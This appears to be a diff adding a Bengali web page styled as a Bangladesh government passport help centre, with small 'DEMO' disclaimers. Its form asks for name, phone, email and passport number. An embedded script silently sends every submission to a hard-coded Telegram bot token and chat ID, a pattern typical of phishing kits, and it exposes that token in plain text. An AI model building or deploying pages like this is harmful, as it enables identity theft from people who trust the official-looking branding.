@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="bn">  
+<head>  
+<meta charset="utf-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">  
+<title>সমস্যা পাঠান — Passport Help</title>  
+<style>  
+*{box-sizing:border-box}  
+html,body{margin:0;padding:0}  
+body{  
+  font-family:"Noto Sans Bengali","Nirmala UI","Segoe UI",sans-serif;  
+  background:#f4fbf8;color:#073b2a;  
+  line-height:1.5;  
+}  
+.demo{  
+  position:sticky;top:0;z-index:99;text-align:center;  
+  background:#8b0000;color:#fff;font-weight:800;  
+  padding:7px 10px;font-size:13px;  
+}  
+.top{  
+  background:#075c3b;color:#fff;padding:10px 16px;  
+  font-size:14px;text-align:center;font-weight:700  
+}  
+.header{  
+  background:#fff;padding:16px;display:flex;align-items:center;  
+  justify-content:space-between;gap:12px;border-bottom:1px solid #e4eee9  
+}  
+.brand{display:flex;align-items:center;gap:12px}  
+.logo{  
+  width:58px;height:58px;border:3px solid #087044;border-radius:50%;  
+  display:grid;place-items:center;color:#087044;font-weight:900;  
+  font-size:11px;text-align:center;background:#fff  
+}  
+.brand h1{font-size:22px;margin:0;color:#075c3b}  
+.brand p{margin:2px 0 0;font-size:12px;color:#315b4c}  
+.menu{  
+  width:48px;height:44px;border:1px solid #d7e7df;border-radius:12px;  
+  background:#fff;font-size:27px;color:#075c3b  
+}  
+.container{  
+  padding:18px 16px;  
+}  
+.form-section{  
+  background:#fff;border-radius:18px;padding:20px;box-shadow:0 4px 14px rgba(0,0,0,.05)  
+}  
+.form-section h2{  
+  font-size:22px;color:#075c3b;margin:0 0 18px;text-align:center  
+}  
+.form-group{  
+  margin-bottom:16px  
+}  
+.form-group label{  
+  display:block;font-weight:700;margin-bottom:6px;color:#075c3b;font-size:14px  
+}  
+.form-group input,  
+.form-group textarea{  
+  width:100%;padding:12px;border:1px solid #d7e7df;border-radius:8px;  
+  font-family:"Noto Sans Bengali","Nirmala UI","Segoe UI",sans-serif;  
+  font-size:14px;color:#073b2a  
+}  
+.form-group input:focus,  
+.form-group textarea:focus{  
+  outline:none;border-color:#087044;box-shadow:0 0 0 3px rgba(8,112,68,.1)  
+}  
+.form-group textarea{  
+  resize:vertical;min-height:120px  
+}  
+.button-group{  
+  display:flex;gap:10px;margin-top:20px  
+}  
+.btn{  
+  flex:1;padding:15px;border:none;border-radius:8px;  
+  font-family:"Noto Sans Bengali","Nirmala UI","Segoe UI",sans-serif;  
+  font-size:16px;font-weight:700;cursor:pointer;  
+  transition:all 0.3s  
+}  
+.btn-submit{  
+  background:#087044;color:#fff  
+}  
+.btn-submit:hover{  
+  background:#065c38;box-shadow:0 6px 14px rgba(8,112,68,.2)  
+}  
+.btn-back{  
+  background:#e6f5ff;color:#064e9b;text-decoration:none;display:flex;align-items:center;justify-content:center  
+}  
+.btn-back:hover{  
+  background:#d0e6ff  
+}  
+.footer{  
+  background:#075c3b;color:#fff;padding:24px 16px;text-align:center;margin-top:20px  
+}  
+.footer strong{font-size:18px}.footer p{margin:5px 0;font-size:13px}  
+.loading{  
+  display:none;text-align:center;margin:20px 0  
+}  
+.spinner{  
+  border:4px solid #f3f3f3;border-top:4px solid #087044;border-radius:50%;width:40px;height:40px;  
+  animation:spin 1s linear infinite;margin:0 auto  
+}  
+@keyframes spin{  
+  0%{transform:rotate(0deg)}  
+  100%{transform:rotate(360deg)}  
+}  
+@media(min-width:600px){  
+  body{max-width:480px;margin:auto;box-shadow:0 0 30px rgba(0,0,0,.12)}  
+}  
+</style>  
+</head>  
+<body>  
+<div class="demo">DEMO — এটি কোনো সরকারি ওয়েবসাইট নয়</div>  
+<div class="top">গণপ্রজাতন্ত্রী বাংলাদেশ — পাসপোর্ট সহায়তা কেন্দ্র</div>  
+<header class="header">  
+  <div class="brand">  
+    <div class="logo">PASSPORT<br>DEMO</div>  
+    <div>  
+      <h1>পাসপোর্ট সহায়তা</h1>  
+      <p>তথ্য ও সেবা নির্দেশিকা</p>  
+    </div>  
+  </div>  
+  <button class="menu" aria-label="Menu">☰</button>  
+</header>  
+
+<div class="container">  
+  <div class="form-section">  
+    <h2>আপনার সমস্যা বর্ণনা করুন</h2>  
+    <form id="contactForm">  
+      <div class="form-group">  
+        <label for="name">আপনার নাম *</label>  
+        <input type="text" id="name" name="name" required placeholder="সম্পূর্ণ নাম লিখুন">  
+      </div>  
+
+      <div class="form-group">  
+        <label for="phone">ফোন নম্বর *</label>  
+        <input type="tel" id="phone" name="phone" required placeholder="০১XXXXXXXXX">  
+      </div>  
+
+      <div class="form-group">  
+        <label for="email">ইমেইল (ঐচ্ছিক)</label>  
+        <input type="email" id="email" name="email" placeholder="আপনার ইমেইল">  
+      </div>  
+
+      <div class="form-group">  
+        <label for="passport">পাসপোর্ট নম্বর *</label>  
+        <input type="text" id="passport" name="passport" required placeholder="পাসপোর্ট নম্বর">  
+      </div>  
+
+      <div class="form-group">  
+        <label for="problem">সমস্যার বিবরণ *</label>  
+        <textarea id="problem" name="problem" required placeholder="আপনার সমস্যা বিস্তারিত বর্ণনা করুন..."></textarea>  
+      </div>  
+
+      <div class="loading" id="loading">  
+        <div class="spinner"></div>  
+        <p>পাঠানো হচ্ছে...</p>  
+      </div>  
+
+      <div class="button-group">  
+        <a href="index.html" class="btn btn-back">← পিছিয়ে যান</a>  
+        <button type="submit" class="btn btn-submit">✓ পাঠান</button>  
+      </div>  
+    </form>  
+  </div>  
+</div>  
+
+<footer class="footer">  
+  <strong>পাসপোর্ট সহায়তা — DEMO</strong>  
+  <p>এটি একটি ডিজাইন/কোডিং ডেমো। কোনো সরকারি সেবা বা সরকারি ওয়েবসাইট নয়।</p>  
+</footer>  
+
+<script>
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = '8621142686:AAF2e0qgnO8bSWO4_oFkcIYT696ElLVbOyQ';
+const TELEGRAM_CHAT_ID = '8516934257';
+
+document.getElementById('contactForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  
+  // ফর্ম ডেটা সংগ্রহ করুন
+  const formData = {
+    name: document.getElementById('name').value,
+    phone: document.getElementById('phone').value,
+    email: document.getElementById('email').value,
+    passport: document.getElementById('passport').value,
+    problem: document.getElementById('problem').value
+  };
+  
+  // লোডিং দেখান
+  document.getElementById('loading').style.display = 'block';
+  
+  // টেলিগ্রাম মেসেজ তৈরি করুন
+  const message = `🔔 *নতুন সমস্যা পাঠানো হয়েছে*
+
+👤 *নাম:* ${formData.name}
+📱 *ফোন:* ${formData.phone}
+📧 *ইমেইল:* ${formData.email || 'নেই'}
+🛂 *পাসপোর্ট নম্বর:* ${formData.passport}
+
+📝 *সমস্যার বিবরণ:*
+${formData.problem}
+
+---
+_এই তথ্য Passport Help Demo পোর্টাল থেকে এসেছে_`;
+  
+  try {
+    // টেলিগ্রাম API তে পাঠান
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+    
+    if (response.ok) {
+      // সফল - সাকসেস পেজে নিয়ে যান
+      document.getElementById('loading').style.display = 'none';
+      // ফর্ম ডেটা সংরক্ষণ করে পরবর্তী পেজে পাঠান
+      sessionStorage.setItem('userData', JSON.stringify(formData));
+      window.location.href = 'success.html';
+    } else {
+      throw new Error('পাঠানো ব্যর্থ হয়েছে');
+    }
+  } catch (error) {
+    document.getElementById('loading').style.display = 'none';
+    alert('ত্রুটি: ' + error.message + '\n\nদয়া করে পুনরায় চেষ্টা করুন।');
+  }
+});
+</script>
+
+</body>  
+</html>
